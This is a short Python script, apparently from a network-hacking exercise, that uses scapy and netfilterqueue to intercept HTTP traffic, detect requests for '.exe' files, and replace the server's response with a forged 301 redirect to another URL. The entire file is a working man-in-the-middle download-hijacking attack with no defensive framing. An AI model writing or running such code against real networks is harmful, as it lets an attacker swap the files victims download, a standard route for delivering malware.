import scapy.all as scapy
import netfilterqueue

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("Target Trying Download")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replacing File")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://mek.muh.firat.edu.tr/sites/mek.muh.firat.edu.tr/files/Mezuniyet%20S%C4%B1nav%C4%B1_0.pdf\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))




    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()